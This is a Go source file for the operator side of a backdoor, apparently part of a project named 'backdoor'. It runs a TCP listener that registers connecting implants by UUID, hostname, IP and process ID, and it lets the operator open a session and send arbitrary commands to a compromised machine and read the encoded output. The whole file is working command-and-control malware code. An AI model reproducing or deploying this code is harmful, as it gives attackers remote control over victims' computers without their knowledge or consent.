package main

import (
	"backdoor/util"
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"sync/atomic"
	"time"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Printf("Usage:%s ip:port\n", os.Args[0])
		return
	}
	listener, err := net.Listen("tcp", os.Args[1])
	if err != nil {
		fmt.Println(err)
		return
	}
	go loopListen(listener)
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Printf("Mgr:")
		if !scanner.Scan() {
			break
		}
		cmd := strings.TrimSpace(scanner.Text())
		if len(cmd) == 0 {
			continue
		}
		strarr := strings.Split(cmd, " ")
		if strarr[0] != "session" {
			fmt.Println("unknown command")
			continue
		}
		if len(strarr) == 1 {
			for _, info := range ginfomgr.All() {
				fmt.Printf("uuid:%s host:%s ip:%s pid:%d time:%s\n", info.UUID, info.HostName, info.LocalIP, info.PID, info.Time)
			}
		} else {
			session(strarr[1], scanner)
		}
	}
}

func session(uuid string, scanner *bufio.Scanner) {
	if !ginfomgr.Exist(uuid) {
		fmt.Println("uuid is not exist")
		return
	}
	fmt.Printf("waiting %s\n", uuid)
	conn, pdecoder := gwait.Wait(uuid)
	defer conn.Close()
	cmdchan := make(chan string)
	defer close(cmdchan)
	var exitflag uint32
	go read(&exitflag, conn, pdecoder)
	go write(cmdchan, conn)
	fmt.Printf("%s come back\n", uuid)
	for {
		if !scanner.Scan() {
			break
		}
		if atomic.LoadUint32(&exitflag) != 0 {
			break
		}
		cmdstr := strings.TrimSpace(scanner.Text())
		if len(cmdstr) == 0 {
			continue
		}
		if cmdstr == "exit" {
			break
		}
		cmdchan <- cmdstr
	}
}

func read(exitflag *uint32, conn net.Conn, pdecoder *util.Decoder) {
	for {
		readBytes, err := util.TcpReadMsg(conn, 0)
		if err != nil {
			break
		}
		readBytes, err = pdecoder.Decode(readBytes)
		if err != nil {
			break
		}
		if len(readBytes) != 0 {
			fmt.Printf("%s", string(readBytes))
		}
	}
	atomic.StoreUint32(exitflag, 1)
}

func write(cmdchan chan string, conn net.Conn) {
	pencoder := util.NewEncoder()
	for {
		var timeout bool
		var cmd string
		var ok bool
		select {
		case cmd, ok = <-cmdchan:
		case <-time.After(3 * time.Second):
			timeout = true
		}
		if timeout {
			var req util.Request
			req.Magic = util.Magic
			jsonBytes, _ := json.Marshal(&req)
			util.TcpWriteMsg(conn, pencoder.Encode(jsonBytes))
			continue
		}
		if !ok {
			break
		}
		var req util.Request
		req.Magic = util.Magic
		req.Cmd = cmd
		jsonBytes, _ := json.Marshal(&req)
		util.TcpWriteMsg(conn, pencoder.Encode(jsonBytes))
	}
}

func loopListen(listener net.Listener) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go newConn(conn)
	}
}

func newConn(conn net.Conn) {
	infobytes, err := util.TcpReadMsg(conn, 12*time.Second)
	if err != nil {
		conn.Close()
		return
	}
	pdecoder := util.NewDecoder()
	infobytes, err = pdecoder.Decode(infobytes)
	if err != nil {
		conn.Close()
		return
	}
	pinfo := new(util.Info)
	if err := json.Unmarshal(infobytes, pinfo); err != nil {
		conn.Close()
		return
	}
	if pinfo.Magic != util.Magic {
		conn.Close()
		return
	}
	pinfo.Time = time.Now().Format(time.RFC3339)
	ginfomgr.Add(pinfo)
	if gwait.IsNeed(pinfo.UUID, conn, pdecoder) {
		return
	}
	conn.Close()
}
